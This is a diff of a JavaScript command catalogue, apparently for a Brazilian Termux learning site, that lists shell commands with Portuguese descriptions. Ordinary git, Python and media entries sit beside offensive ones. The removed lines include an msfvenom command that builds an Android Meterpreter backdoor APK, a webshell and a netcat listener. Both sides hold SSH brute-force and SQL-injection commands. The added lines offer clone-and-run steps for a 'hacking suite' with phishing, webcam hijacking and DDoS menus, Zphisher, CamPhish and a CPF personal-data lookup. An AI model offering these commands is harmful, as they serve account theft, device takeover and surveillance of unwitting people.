-    { id: 88, cmd: "curl -I https://google.com",           desc: "Ver cabeçalhos HTTP de resposta de um site.", level: "intermediario", cat: "web", tags: ["curl", "headers"] },
-    { id: 89, cmd: "wget --mirror -p --convert-links URL", desc: "Baixar site inteiro para backup offline.", level: "intermediario", cat: "web", tags: ["wget", "mirror"] },
-    { id: 90, cmd: "pkg install postgresql",               desc: "PostgreSQL — banco relacional avançado.", level: "intermediario", cat: "web", tags: ["postgresql", "banco"] },
-    { id: 91, cmd: "pkg install redis",                    desc: "Redis — banco chave-valor em memória para cache.", level: "intermediario", cat: "web", tags: ["redis", "cache"] },
-    { id: 92, cmd: "pip install requests",                 desc: "Requests — biblioteca Python para requisições HTTP.", level: "intermediario", cat: "programacao", tags: ["requests", "python"] },
-    { id: 93, cmd: "pip install beautifulsoup4",           desc: "BeautifulSoup4 — web scraping com Python.", level: "intermediario", cat: "programacao", tags: ["beautifulsoup", "scraping"] },
-    { id: 94, cmd: "pip install selenium",                 desc: "Selenium — automação de navegador com Python.", level: "intermediario", cat: "programacao", tags: ["selenium", "automacao"] },
-    { id: 95, cmd: "pip install pandas",                   desc: "Pandas — análise e manipulação de dados.", level: "intermediario", cat: "programacao", tags: ["pandas", "dados"] },
-    { id: 96, cmd: "pip install numpy",                    desc: "NumPy — computação numérica e matrizes.", level: "intermediario", cat: "programacao", tags: ["numpy"] },
-    { id: 97, cmd: "pip install flask flask-socketio",     desc: "Flask + WebSocket para apps em tempo real.", level: "intermediario", cat: "programacao", tags: ["flask", "websocket"] },
-    { id: 98, cmd: "npm install socket.io",                desc: "Socket.IO — comunicação bidirecional em tempo real.", level: "intermediario", cat: "programacao", tags: ["socket.io"] },
-    { id: 99, cmd: "pip install discord.py",               desc: "Criar bot para Discord com Python.", level: "intermediario", cat: "programacao", tags: ["discord", "bot"] },
-    { id: 100, cmd: "npm install discord.js",              desc: "Criar bot para Discord com Node.js/JavaScript.", level: "intermediario", cat: "programacao", tags: ["discord.js", "bot"] },
-    { id: 101, cmd: "pip install telebot",                 desc: "Criar bot para Telegram com Python.", level: "intermediario", cat: "programacao", tags: ["telegram", "bot"] },
-    { id: 102, cmd: "pip install twilio",                  desc: "Twilio — enviar SMS e fazer chamadas via API.", level: "intermediario", cat: "programacao", tags: ["twilio", "sms"] },
-    { id: 103, cmd: "git clone https://github.com/usuario/repo", desc: "Clonar repositório do GitHub para sua máquina.", level: "intermediario", cat: "git", tags: ["git", "clone"] },
-    { id: 104, cmd: "git init && git add . && git commit -m 'init'", desc: "Iniciar repositório Git e fazer primeiro commit.", level: "intermediario", cat: "git", tags: ["git", "init"] },
-    { id: 105, cmd: "git push origin main",                desc: "Enviar commits para branch main do repositório remoto.", level: "intermediario", cat: "git", tags: ["git", "push"] },
-    { id: 106, cmd: "git pull origin main",                desc: "Atualizar branch local com mudanças do remoto.", level: "intermediario", cat: "git", tags: ["git", "pull"] },
-    { id: 107, cmd: "git checkout -b feature-nova",        desc: "Criar e trocar para nova branch 'feature-nova'.", level: "intermediario", cat: "git", tags: ["git", "branch"] },
-    { id: 108, cmd: "git merge feature-nova",              desc: "Mergir branch feature-nova na branch atual.", level: "intermediario", cat: "git", tags: ["git", "merge"] },
-    { id: 109, cmd: "git log --oneline --graph --all",     desc: "Visualizar histórico de commits em grafo.", level: "intermediario", cat: "git", tags: ["git", "log"] },
-    { id: 110, cmd: "git stash && git stash pop",          desc: "Salvar mudanças temporariamente e restaurar depois.", level: "intermediario", cat: "git", tags: ["git", "stash"] },
-    { id: 111, cmd: "pkg install openssh && ssh-keygen",   desc: "Gerar chave SSH para autenticação segura.", level: "intermediario", cat: "ssh", tags: ["ssh", "keygen"] },
-    { id: 112, cmd: "ssh-copy-id usuario@ip",              desc: "Copiar chave pública SSH para servidor remoto.", level: "intermediario", cat: "ssh", tags: ["ssh-copy-id"] },
-    { id: 113, cmd: "ssh -p 2222 usuario@ip",              desc: "Conectar via SSH em porta diferente (2222).", level: "intermediario", cat: "ssh", tags: ["ssh", "porta"] },
-    { id: 114, cmd: "pkg install rsync && rsync -avz pasta/ user@ip:/destino", desc: "Rsync — sincronização eficiente de arquivos.", level: "intermediario", cat: "ssh", tags: ["rsync", "sync"] },
-    { id: 115, cmd: "scp arquivo.txt user@ip:/home/",      desc: "Copiar arquivo via SSH com SCP.", level: "intermediario", cat: "ssh", tags: ["scp", "ssh"] },
-    { id: 116, cmd: "pkg install nmap",                    desc: "Nmap — scanner de portas para análise de rede.", level: "intermediario", cat: "rede", tags: ["nmap", "scan"] },
-    { id: 117, cmd: "nmap -sV 192.168.0.1",               desc: "Escaneamento de versão de serviços em um IP.", level: "intermediario", cat: "rede", tags: ["nmap"] },
-    { id: 118, cmd: "nmap -p- 192.168.0.1",               desc: "Escaneamento de TODAS as 65535 portas.", level: "intermediario", cat: "rede", tags: ["nmap", "portas"] },
-    { id: 119, cmd: "ping -c 10 google.com",               desc: "Ping — testar conectividade com 10 pacotes.", level: "intermediario", cat: "rede", tags: ["ping"] },
-    { id: 120, cmd: "traceroute google.com",               desc: "Traceroute — mostrar rota dos pacotes até o destino.", level: "intermediario", cat: "rede", tags: ["traceroute"] },
-    { id: 121, cmd: "pkg install netcat-openbsd",          desc: "Netcat — ferramenta de rede para port scanning e conexões.", level: "intermediario", cat: "rede", tags: ["netcat", "nc"] },
-    { id: 122, cmd: "nc -lvp 4444",                       desc: "Netcat — ouvir conexões na porta 4444.", level: "intermediario", cat: "rede", tags: ["nc", "listen"] },
-    { id: 123, cmd: "pkg install iperf3",                  desc: "Iperf3 — medir largura de banda da rede.", level: "intermediario", cat: "rede", tags: ["iperf", "banda"] },
-    { id: 124, cmd: "ip a",                                desc: "Mostrar interfaces de rede e endereços IP.", level: "intermediario", cat: "rede", tags: ["ip"] },
-    { id: 125, cmd: "pkg install aircrack-ng",             desc: "Aircrack-ng — suite de auditoria Wi-Fi.", level: "intermediario", cat: "rede", tags: ["aircrack"] },
+    // =============================================
+    // PERSONALIZAÇÃO (Repositórios do Clube)
+    // =============================================
+    { id: 56, cmd: "pkg install figlet zsh",               desc: "Instalar Figlet + Zsh — base para personalizar o prompt. (termux-prompt-installer)", level: "basico", cat: "personalizar", tags: ["figlet", "zsh", "prompt"], repo: "termux-prompt-installer", repoUrl: "https://github.com/carlos46743/termux-prompt-installer" },
+    { id: 57, cmd: "git clone https://github.com/carlos46743/termux-prompt-installer", desc: "Clonar o instalador de prompt personalizado do Clube do Termux.", level: "basico", cat: "personalizar", tags: ["prompt", "instalador", "clone"], repo: "termux-prompt-installer", repoUrl: "https://github.com/carlos46743/termux-prompt-installer" },
+    { id: 58, cmd: "cd termux-prompt-installer && bash install.sh", desc: "Executar instalador interativo de prompt personalizado com banner Figlet e Zsh.", level: "intermediario", cat: "personalizar", tags: ["prompt", "install", "interativo"], repo: "termux-prompt-installer", repoUrl: "https://github.com/carlos46743/termux-prompt-installer" },
+    { id: 59, cmd: "figlet -f big 'NOME'",                desc: "Criar banner ASCII gigante com Figlet. Base do prompt personalizado.", level: "basico", cat: "personalizar", tags: ["figlet", "banner", "ascii"] },
+    { id: 60, cmd: "python termux_assistant.py",          desc: "Iniciar Mini LLM Assistant — IA que aprende com conversas no Termux. (mini-llm-termux)", level: "intermediario", cat: "personalizar", tags: ["llm", "ia", "assistente"], repo: "mini-llm-termux", repoUrl: "https://github.com/carlos46743/mini-llm-termux" },
+    { id: 61, cmd: "git clone https://github.com/carlos46743/mini-llm-termux", desc: "Clonar Mini LLM — inteligência artificial para Termux com aprendizado contínuo.", level: "intermediario", cat: "personalizar", tags: ["llm", "clone", "ia"], repo: "mini-llm-termux", repoUrl: "https://github.com/carlos46743/mini-llm-termux" },
+    { id: 62, cmd: "cd mini-llm-termux && bash install.sh", desc: "Instalar Mini LLM — dependências e configuração automática.", level: "intermediario", cat: "personalizar", tags: ["llm", "install"], repo: "mini-llm-termux", repoUrl: "https://github.com/carlos46743/mini-llm-termux" },
+    { id: 63, cmd: "pip install requests beautifulsoup4",  desc: "Dependências Python para o Mini LLM acessar internet e aprender.", level: "intermediario", cat: "personalizar", tags: ["python", "llm", "dependencias"], repo: "mini-llm-termux", repoUrl: "https://github.com/carlos46743/mini-llm-termux" },
+    { id: 64, cmd: "chsh -s zsh",                         desc: "Definir Zsh como shell padrão do Termux.", level: "basico", cat: "personalizar", tags: ["zsh", "shell", "padrao"] },
+    { id: 65, cmd: "exec zsh",                            desc: "Ativar Zsh na sessão atual sem reiniciar o Termux.", level: "basico", cat: "personalizar", tags: ["zsh", "exec"] },
+    { id: 66, cmd: "nano ~/.zshrc",                       desc: "Editar manualmente o arquivo de configuração do Zsh.", level: "intermediario", cat: "personalizar", tags: ["zshrc", "nano", "config"] },
+    { id: 67, cmd: "cp ~/.zshrc ~/.zshrc.bak",            desc: "Fazer backup do .zshrc antes de modificar.", level: "basico", cat: "personalizar", tags: ["backup", "zshrc"] },
 
-    // ===== AVANÇADO =====
-    { id: 126, cmd: "pkg install kali-tools",              desc: "Instalar ferramentas Kali Linux no Termux (root requerido).", level: "avancado", cat: "pentest", tags: ["kali", "tools"] },
-    { id: 127, cmd: "pkg install metasploit",              desc: "Metasploit — framework de exploração e payloads.", level: "avancado", cat: "pentest", tags: ["metasploit", "exploit"] },
-    { id: 128, cmd: "pkg install hydra",                   desc: "Hydra — brute-force em senhas de serviços.", level: "avancado", cat: "pentest", tags: ["hydra", "bruteforce"] },
-    { id: 129, cmd: "hydra -l admin -P senhas.txt ssh://192.168.0.1", desc: "Brute-force SSH com lista de senhas.", level: "avancado", cat: "pentest", tags: ["hydra", "ssh"] },
-    { id: 130, cmd: "pkg install sqlmap",                  desc: "SQLMap — detecção e exploração de SQL injection.", level: "avancado", cat: "pentest", tags: ["sqlmap", "sqli"] },
-    { id: 131, cmd: "sqlmap -u 'http://site.com/page?id=1' --dbs", desc: "SQLMap — listar bancos de dados do alvo.", level: "avancado", cat: "pentest", tags: ["sqlmap"] },
-    { id: 132, cmd: "pkg install john",                    desc: "John The Ripper — cracker de senhas.", level: "avancado", cat: "pentest", tags: ["john", "senha"] },
-    { id: 133, cmd: "john --wordlist=rockyou.txt hash.txt", desc: "John com wordlist RockYou para quebrar hashes.", level: "avancado", cat: "pentest", tags: ["john"] },
-    { id: 134, cmd: "pkg install hashcat",                 desc: "Hashcat — quebrador de hashes com GPU.", level: "avancado", cat: "pentest", tags: ["hashcat", "gpu"] },
-    { id: 135, cmd: "pkg install nmap && nmap -O 192.168.0.1", desc: "Nmap — detecção de sistema operacional.", level: "avancado", cat: "pentest", tags: ["nmap", "os"] },
-    { id: 136, cmd: "nmap --script vuln 192.168.0.1",      desc: "Nmap — escanear vulnerabilidades conhecidas.", level: "avancado", cat: "pentest", tags: ["nmap", "vuln"] },
-    { id: 137, cmd: "pkg install nikto",                   desc: "Nikto — scanner de vulnerabilidades web.", level: "avancado", cat: "pentest", tags: ["nikto", "web"] },
-    { id: 138, cmd: "nikto -h http://192.168.0.1",         desc: "Nikto — escanear servidor web alvo.", level: "avancado", cat: "pentest", tags: ["nikto"] },
-    { id: 139, cmd: "pkg install wireshark",               desc: "Wireshark — analisador de pacotes de rede.", level: "avancado", cat: "pentest", tags: ["wireshark", "packet"] },
-    { id: 140, cmd: "pkg install tcpdump",                 desc: "Tcpdump — capturar tráfego de rede via terminal.", level: "avancado", cat: "pentest", tags: ["tcpdump"] },
-    { id: 141, cmd: "tcpdump -i wlan0 -n port 80",         desc: "Capturar tráfego HTTP na interface Wi-Fi.", level: "avancado", cat: "pentest", tags: ["tcpdump"] },
-    { id: 142, cmd: "pkg install go",                      desc: "Go — linguagem compilada rápida para ferramentas de rede.", level: "avancado", cat: "programacao", tags: ["golang", "go"] },
-    { id: 143, cmd: "pkg install rust",                    desc: "Rust — linguagem segura e performática para sistemas.", level: "avancado", cat: "programacao", tags: ["rust"] },
-    { id: 144, cmd: "pkg install gcc",                     desc: "GCC — compilador C/C++ no Termux.", level: "avancado", cat: "programacao", tags: ["gcc", "c"] },
-    { id: 145, cmd: "pkg install make",                    desc: "Make — sistema de build para compilar projetos.", level: "avancado", cat: "programacao", tags: ["make", "build"] },
-    { id: 146, cmd: "pkg install cmake",                   desc: "CMake — gerador de build multiplataforma.", level: "avancado", cat: "programacao", tags: ["cmake"] },
-    { id: 147, cmd: "pkg install lua",                     desc: "Lua — linguagem leve para scripts embarcados.", level: "avancado", cat: "programacao", tags: ["lua"] },
-    { id: 148, cmd: "pkg install perl",                    desc: "Perl — linguagem para processamento de texto e scripts.", level: "avancado", cat: "programacao", tags: ["perl"] },
-    { id: 149, cmd: "pkg install ruby",                    desc: "Ruby — linguagem elegante para web e scripts.", level: "avancado", cat: "programacao", tags: ["ruby"] },
-    { id: 150, cmd: "pkg install proot",                   desc: "Proot — rodar distribuições Linux sem root.", level: "avancado", cat: "sistema", tags: ["proot", "linux"] },
-    { id: 151, cmd: "pkg install proot-distro",            desc: "Proot-distro — gerenciar distribuições Linux.", level: "avancado", cat: "sistema", tags: ["proot-distro"] },
-    { id: 152, cmd: "proot-distro install ubuntu",         desc: "Instalar Ubuntu no Termux via proot.", level: "avancado", cat: "sistema", tags: ["ubuntu", "proot"] },
-    { id: 153, cmd: "proot-distro install debian",         desc: "Instalar Debian no Termux.", level: "avancado", cat: "sistema", tags: ["debian", "proot"] },
-    { id: 154, cmd: "proot-distro install kali",           desc: "Instalar Kali Linux no Termux (sem root).", level: "avancado", cat: "sistema", tags: ["kali", "proot"] },
-    { id: 155, cmd: "proot-distro login ubuntu",           desc: "Entrar no Ubuntu instalado via proot.", level: "avancado", cat: "sistema", tags: ["proot", "ubuntu"] },
-    { id: 156, cmd: "pkg install x11-repo",                desc: "Adicionar repositório X11 para apps gráficos.", level: "avancado", cat: "sistema", tags: ["x11", "repo"] },
-    { id: 157, cmd: "pkg install xfce4",                   desc: "XFCE — desktop gráfico leve no Termux com VNC.", level: "avancado", cat: "sistema", tags: ["xfce", "desktop"] },
-    { id: 158, cmd: "pkg install tigervnc",                desc: "TigerVNC — servidor VNC para acesso remoto gráfico.", level: "avancado", cat: "sistema", tags: ["vnc", "remote"] },
-    { id: 159, cmd: "vncserver :1",                        desc: "Iniciar servidor VNC na porta 5901.", level: "avancado", cat: "sistema", tags: ["vncserver"] },
-    { id: 160, cmd: "pkg install code-server",             desc: "code-server — VS Code rodando no navegador.", level: "avancado", cat: "sistema", tags: ["code-server", "vscode"] },
-    { id: 161, cmd: "pkg install docker",                  desc: "Docker — conteinerização no Termux (se suportado).", level: "avancado", cat: "sistema", tags: ["docker", "container"] },
-    { id: 162, cmd: "pip install opencv-python",           desc: "OpenCV — visão computacional e processamento de imagem.", level: "avancado", cat: "programacao", tags: ["opencv", "visao"] },
-    { id: 163, cmd: "pip install tensorflow",              desc: "TensorFlow — machine learning e deep learning.", level: "avancado", cat: "programacao", tags: ["tensorflow", "ml"] },
-    { id: 164, cmd: "pip install torch",                   desc: "PyTorch — framework de deep learning flexível.", level: "avancado", cat: "programacao", tags: ["pytorch", "dl"] },
-    { id: 165, cmd: "pip install scikit-learn",            desc: "Scikit-learn — machine learning clássico em Python.", level: "avancado", cat: "programacao", tags: ["sklearn", "ml"] },
-    { id: 166, cmd: "ffmpeg -i video.mp4 -vf scale=640:480 output.mp4", desc: "Redimensionar vídeo para 640x480 com FFmpeg.", level: "avancado", cat: "midia", tags: ["ffmpeg"] },
-    { id: 167, cmd: "ffmpeg -i video.mp4 -ss 00:01:30 -t 5 clip.mp4", desc: "Cortar clipe de 5 segundos a partir de 1min30.", level: "avancado", cat: "midia", tags: ["ffmpeg"] },
-    { id: 168, cmd: "ffmpeg -i video.mp4 -vn -c:a mp3 audio.mp3", desc: "Extrair áudio de vídeo para MP3.", level: "avancado", cat: "midia", tags: ["ffmpeg"] },
-    { id: 169, cmd: "ffmpeg -f image2 -i frame%04d.png video.mp4", desc: "Criar vídeo a partir de sequência de imagens.", level: "avancado", cat: "midia", tags: ["ffmpeg"] },
-    { id: 170, cmd: "pkg install youtube-dl && youtube-dl -f best 'URL'", desc: "Baixar vídeo na máxima qualidade.", level: "avancado", cat: "midia", tags: ["youtube-dl"] },
-    { id: 171, cmd: "yt-dlp -x --audio-format mp3 'URL'", desc: "Baixar apenas áudio de vídeo em MP3.", level: "avancado", cat: "midia", tags: ["yt-dlp"] },
-    { id: 172, cmd: "pkg install shellcheck",              desc: "ShellCheck — análise estática de scripts shell.", level: "avancado", cat: "programacao", tags: ["shellcheck"] },
-    { id: 173, cmd: "pkg install shfmt",                   desc: "Shfmt — formatador automático de scripts shell.", level: "avancado", cat: "programacao", tags: ["shfmt"] },
-    { id: 174, cmd: "pkg install dnsutils",                desc: "DNS Utils — nslookup, dig para consultas DNS.", level: "avancado", cat: "rede", tags: ["dns", "dig"] },
-    { id: 175, cmd: "dig +short google.com",               desc: "Resolver DNS rápido de um domínio.", level: "avancado", cat: "rede", tags: ["dig"] },
-    { id: 176, cmd: "whois google.com",                    desc: "Whois — obter dados de registro de domínio.", level: "avancado", cat: "rede", tags: ["whois"] },
-    { id: 177, cmd: "theharvester -d google.com -b google", desc: "TheHarvester — coleta de emails e subdomínios.", level: "avancado", cat: "pentest", tags: ["theharvester", "osint"] },
-    { id: 178, cmd: "pkg install recon-ng",                desc: "Recon-NG — framework completo de OSINT.", level: "avancado", cat: "pentest", tags: ["recon-ng", "osint"] },
-    { id: 179, cmd: "pkg install sherlock",                desc: "Sherlock — buscar contas em redes sociais.", level: "avancado", cat: "pentest", tags: ["sherlock", "osint"] },
-    { id: 180, cmd: "sherlock usuario",                    desc: "Buscar nome de usuário em centenas de sites.", level: "avancado", cat: "pentest", tags: ["sherlock"] },
-    { id: 181, cmd: "pkg install holehe",                  desc: "Holehe — verificar emails em serviços online.", level: "avancado", cat: "pentest", tags: ["holehe", "email"] },
-    { id: 182, cmd: "holehe email@example.com",            desc: "Verificar se email está cadastrado em sites.", level: "avancado", cat: "pentest", tags: ["holehe"] },
-    { id: 183, cmd: "pkg install tor",                     desc: "Tor — navegação anônima pela rede onion.", level: "avancado", cat: "rede", tags: ["tor", "anonimo"] },
-    { id: 184, cmd: "pkg install proxychains-ng",          desc: "ProxyChains — forçar tráfego via proxies.", level: "avancado", cat: "rede", tags: ["proxychains"] },
-    { id: 185, cmd: "proxychains4 nmap -sT target.com",    desc: "Nmap anônimo via ProxyChains + Tor.", level: "avancado", cat: "rede", tags: ["proxychains", "nmap"] },
-    { id: 186, cmd: "pip install mitmproxy",               desc: "Mitmproxy — proxy interceptador para análise de tráfego.", level: "avancado", cat: "rede", tags: ["mitmproxy", "proxy"] },
-    { id: 187, cmd: "mitmproxy --mode transparent",        desc: "Mitmproxy em modo transparente.", level: "avancado", cat: "rede", tags: ["mitmproxy"] },
-    { id: 188, cmd: "pkg install bettercap",               desc: "BetterCAP — framework de ataque e monitoramento de rede.", level: "avancado", cat: "pentest", tags: ["bettercap"] },
-    { id: 189, cmd: "bettercap -eval 'net.probe on'",      desc: "BetterCAP — descobrir dispositivos na rede.", level: "avancado", cat: "pentest", tags: ["bettercap"] },
-    { id: 190, cmd: "pkg install ettercap",                desc: "Ettercap — MITM e sniffing de rede.", level: "avancado", cat: "pentest", tags: ["ettercap"] },
-    { id: 191, cmd: "pkg install wifite",                  desc: "Wifite — automatizar ataques a redes Wi-Fi.", level: "avancado", cat: "pentest", tags: ["wifite"] },
-    { id: 192, cmd: "pkg install dnsmasq",                 desc: "Dnsmasq — servidor DNS/DHCP leve.", level: "avancado", cat: "rede", tags: ["dnsmasq"] },
-    { id: 193, cmd: "pkg install hostapd",                 desc: "Hostapd — criar ponto de acesso Wi-Fi.", level: "avancado", cat: "rede", tags: ["hostapd"] },
-    { id: 194, cmd: "pkg install arp-scan",                desc: "Arp-scan — descobrir IPs e MACs na rede local.", level: "avancado", cat: "rede", tags: ["arp-scan"] },
-    { id: 195, cmd: "arp-scan --localnet",                  desc: "Escaneamento ARP de toda rede local.", level: "avancado", cat: "rede", tags: ["arp-scan"] },
-    { id: 196, cmd: "pkg install exploitdb",               desc: "ExploitDB — banco local de exploits famosos.", level: "avancado", cat: "pentest", tags: ["exploitdb"] },
-    { id: 197, cmd: "searchsploit apache",                 desc: "SearchSploit — buscar exploits no ExploitDB.", level: "avancado", cat: "pentest", tags: ["searchsploit"] },
-    { id: 198, cmd: "pkg install msfvenom",                desc: "Msfvenom — gerar payloads personalizados.", level: "avancado", cat: "pentest", tags: ["msfvenom"] },
-    { id: 199, cmd: "msfvenom -p android/meterpreter/reverse_tcp LHOST=ip LPORT=4444 -o backdoor.apk", desc: "Gerar backdoor Android com Meterpreter.", level: "avancado", cat: "pentest", tags: ["msfvenom"] },
-    { id: 200, cmd: "pkg install beef-xss",                desc: "BeEF — framework de exploração de navegadores.", level: "avancado", cat: "pentest", tags: ["beef", "xss"] },
-    { id: 201, cmd: "pkg install webshell",                desc: "Webshell — backdoor para servidores web.", level: "avancado", cat: "pentest", tags: ["webshell"] },
-    { id: 202, cmd: "pip install droopescan",              desc: "Droopescan — scanner para Drupal, WordPress, Joomla.", level: "avancado", cat: "pentest", tags: ["droopescan", "cms"] },
-    { id: 203, cmd: "pkg install wpscan",                  desc: "WPScan — scanner de vulnerabilidades WordPress.", level: "avancado", cat: "pentest", tags: ["wpscan", "wordpress"] },
-    { id: 204, cmd: "wpscan --url site.com --enumerate u", desc: "WPScan — enumerar usuários do WordPress.", level: "avancado", cat: "pentest", tags: ["wpscan"] },
-    { id: 205, cmd: "pkg install amass",                   desc: "Amass — mapeamento de subdomínios e OSINT.", level: "avancado", cat: "pentest", tags: ["amass", "osint"] },
-    { id: 206, cmd: "amass enum -d google.com",            desc: "Amass — enumerar subdomínios de um domínio.", level: "avancado", cat: "pentest", tags: ["amass"] },
-    { id: 207, cmd: "pkg install subfinder",               desc: "Subfinder — descobridor rápido de subdomínios.", level: "avancado", cat: "pentest", tags: ["subfinder"] },
-    { id: 208, cmd: "pkg install httpx",                   desc: "Httpx — verificar quais hosts estão ativos via HTTP.", level: "avancado", cat: "pentest", tags: ["httpx"] },
-    { id: 209, cmd: "pip install nuclei",                  desc: "Nuclei — scanner de vulnerabilidades por templates.", level: "avancado", cat: "pentest", tags: ["nuclei"] },
-    { id: 210, cmd: "nuclei -u https://site.com -t cves/",  desc: "Nuclei — escanear CVEs no alvo.", level: "avancado", cat: "pentest", tags: ["nuclei"] },
-    { id: 211, cmd: "pkg install cargo",                   desc: "Cargo — gerenciador de pacotes do Rust.", level: "avancado", cat: "programacao", tags: ["cargo", "rust"] },
-    { id: 212, cmd: "pkg install golang",                  desc: "GoLang — ambiente completo de desenvolvimento Go.", level: "avancado", cat: "programacao", tags: ["golang"] },
-    { id: 213, cmd: "termux-clipboard-set texto",          desc: "Copiar texto para área de transferência.", level: "intermediario", cat: "api", tags: ["clipboard"] },
-    { id: 214, cmd: "termux-clipboard-get",                desc: "Ler texto da área de transferência.", level: "intermediario", cat: "api", tags: ["clipboard"] },
-    { id: 215, cmd: "termux-tts-speak \"Hello World\"",    desc: "Texto-para-fala: celular fala a frase.", level: "intermediario", cat: "api", tags: ["tts"] },
-    { id: 216, cmd: "termux-vibrate -d 500",               desc: "Vibrar o celular por 500ms.", level: "intermediario", cat: "api", tags: ["vibrate"] },
-    { id: 217, cmd: "termux-torch on",                     desc: "Ligar flash da câmera (lanterna).", level: "intermediario", cat: "api", tags: ["torch"] },
-    { id: 218, cmd: "termux-torch off",                    desc: "Desligar flash da câmera.", level: "intermediario", cat: "api", tags: ["torch"] },
-    { id: 219, cmd: "termux-contact-list",                 desc: "Listar contatos do celular.", level: "intermediario", cat: "api", tags: ["contatos"] },
-    { id: 220, cmd: "termux-sms-send -n 5511999999999 \"Oi\"", desc: "Enviar SMS via terminal.", level: "intermediario", cat: "api", tags: ["sms"] },
+    // =============================================
+    // PENTEST & INVESTIGAÇÃO (repos do usuário)
+    // =============================================
+    { id: 68, cmd: "git clone https://github.com/carlos46743/cybertrace-panel", desc: "Clonar CyberTrace Panel — painel de investigação digital (CPF, CNPJ, IP, CEP, Placa).", level: "intermediario", cat: "investigacao", tags: ["cybertrace", "painel", "osint"], repo: "cybertrace-panel", repoUrl: "https://github.com/carlos46743/cybertrace-panel" },
+    { id: 69, cmd: "cd cybertrace-panel && bash cybertrace.sh", desc: "Executar CyberTrace Panel — ferramenta completa de consultas.", level: "intermediario", cat: "investigacao", tags: ["cybertrace", "consulta", "osint"], repo: "cybertrace-panel", repoUrl: "https://github.com/carlos46743/cybertrace-panel" },
+    { id: 70, cmd: "python cpf_consulta.py",              desc: "Executar consulta de CPF via CyberTrace Panel.", level: "intermediario", cat: "investigacao", tags: ["cpf", "consulta", "python"], repo: "cybertrace-panel", repoUrl: "https://github.com/carlos46743/cybertrace-panel" },
+    { id: 71, cmd: "git clone https://github.com/carlos46743/ALHacking", desc: "Clonar ALHacking — suite completa de ferramentas de hacking.", level: "avancado", cat: "investigacao", tags: ["alhacking", "hacking", "tools"], repo: "ALHacking", repoUrl: "https://github.com/carlos46743/ALHacking" },
+    { id: 72, cmd: "cd ALHacking && bash alhack.sh",      desc: "Executar ALHacking Tools — menu com phishing, webcam hack, DDoS, subscan e mais.", level: "avancado", cat: "investigacao", tags: ["alhacking", "menu", "tools"], repo: "ALHacking", repoUrl: "https://github.com/carlos46743/ALHacking" },
+    { id: 73, cmd: "cd ALHacking/Tools && git clone https://github.com/htr-tech/zphisher", desc: "Instalar Zphisher — ferramenta de phishing do ALHacking.", level: "avancado", cat: "investigacao", tags: ["zphisher", "phishing"], repo: "ALHacking", repoUrl: "https://github.com/carlos46743/ALHacking" },
+    { id: 74, cmd: "cd ALHacking/Tools && git clone https://github.com/techchipnet/CamPhish", desc: "Instalar CamPhish — hack de webcam via link.", level: "avancado", cat: "investigacao", tags: ["camphish", "webcam"], repo: "ALHacking", repoUrl: "https://github.com/carlos46743/ALHacking" },
+    { id: 75, cmd: "nmap -sV 192.168.0.1",               desc: "Nmap — escaneamento de versão de serviços em um IP.", level: "intermediario", cat: "rede", tags: ["nmap", "scan"] },
+    { id: 76, cmd: "nmap -p- 192.168.0.1",               desc: "Nmap — escaneamento de TODAS as 65535 portas.", level: "avancado", cat: "rede", tags: ["nmap", "portas"] },
+    { id: 77, cmd: "nmap --script vuln 192.168.0.1",      desc: "Nmap — escanear vulnerabilidades conhecidas.", level: "avancado", cat: "investigacao", tags: ["nmap", "vuln"] },
+    { id: 78, cmd: "pkg install nmap",                    desc: "Instalar Nmap — scanner de portas para análise de rede.", level: "intermediario", cat: "rede", tags: ["nmap", "install"] },
+    { id: 79, cmd: "pkg install hydra",                   desc: "Hydra — brute-force em senhas de serviços.", level: "avancado", cat: "investigacao", tags: ["hydra", "bruteforce"] },
+    { id: 80, cmd: "hydra -l admin -P senhas.txt ssh://192.168.0.1", desc: "Brute-force SSH com lista de senhas.", level: "avancado", cat: "investigacao", tags: ["hydra", "ssh"] },
+    { id: 81, cmd: "pkg install sqlmap",                  desc: "SQLMap — detecção e exploração de SQL injection.", level: "avancado", cat: "investigacao", tags: ["sqlmap", "sqli"] },
+    { id: 82, cmd: "sqlmap -u 'http://site.com/page?id=1' --dbs", desc: "SQLMap — listar bancos de dados do alvo.", level: "avancado", cat: "investigacao", tags: ["sqlmap"] },
+    { id: 83, cmd: "pkg install metasploit",              desc: "Metasploit — framework de exploração e payloads.", level: "avancado", cat: "investigacao", tags: ["metasploit", "exploit"] },
+    { id: 84, cmd: "pkg install john",                    desc: "John The Ripper — cracker de senhas.", level: "avancado", cat: "investigacao", tags: ["john", "senha"] },
+    { id: 85, cmd: "pkg install aircrack-ng",             desc: "Aircrack-ng — suite de auditoria Wi-Fi.", level: "avancado", cat: "rede", tags: ["aircrack"] },
+    { id: 86, cmd: "pkg install wireshark",               desc: "Wireshark — analisador de pacotes de rede.", level: "avancado", cat: "rede", tags: ["wireshark", "packet"] },
+    { id: 87, cmd: "pkg install tcpdump",                 desc: "Tcpdump — capturar tráfego de rede via terminal.", level: "avancado", cat: "rede", tags: ["tcpdump"] },
+    { id: 88, cmd: "tcpdump -i wlan0 -n port 80",         desc: "Capturar tráfego HTTP na interface Wi-Fi.", level: "avancado", cat: "rede", tags: ["tcpdump"] },
+    { id: 89, cmd: "pkg install nikto",                   desc: "Nikto — scanner de vulnerabilidades web.", level: "avancado", cat: "investigacao", tags: ["nikto", "web"] },
+    { id: 90, cmd: "nikto -h http://192.168.0.1",         desc: "Nikto — escanear servidor web alvo.", level: "avancado", cat: "investigacao", tags: ["nikto"] },
+    { id: 91, cmd: "pkg install recon-ng",                desc: "Recon-NG — framework completo de OSINT.", level: "avancado", cat: "investigacao", tags: ["recon-ng", "osint"] },
+    { id: 92, cmd: "pkg install sherlock",                desc: "Sherlock — buscar contas em redes sociais por username.", level: "avancado", cat: "investigacao", tags: ["sherlock", "osint"] },
+    { id: 93, cmd: "sherlock usuario",                    desc: "Buscar nome de usuário em centenas de sites.", level: "avancado", cat: "investigacao", tags: ["sherlock"] },
+    { id: 94, cmd: "pkg install holehe",                  desc: "Holehe — verificar emails em serviços online.", level: "avancado", cat: "investigacao", tags: ["holehe", "email"] },
+    { id: 95, cmd: "holehe email@example.com",            desc: "Verificar se email está cadastrado em sites.", level: "avancado", cat: "investigacao", tags: ["holehe"] },
+    { id: 96, cmd: "pkg install theharvester",            desc: "TheHarvester — coleta de emails e subdomínios.", level: "avancado", cat: "investigacao", tags: ["theharvester", "osint"] },
+    { id: 97, cmd: "theharvester -d google.com -b google", desc: "Coletar informações de domínio com TheHarvester.", level: "avancado", cat: "investigacao", tags: ["theharvester"] },
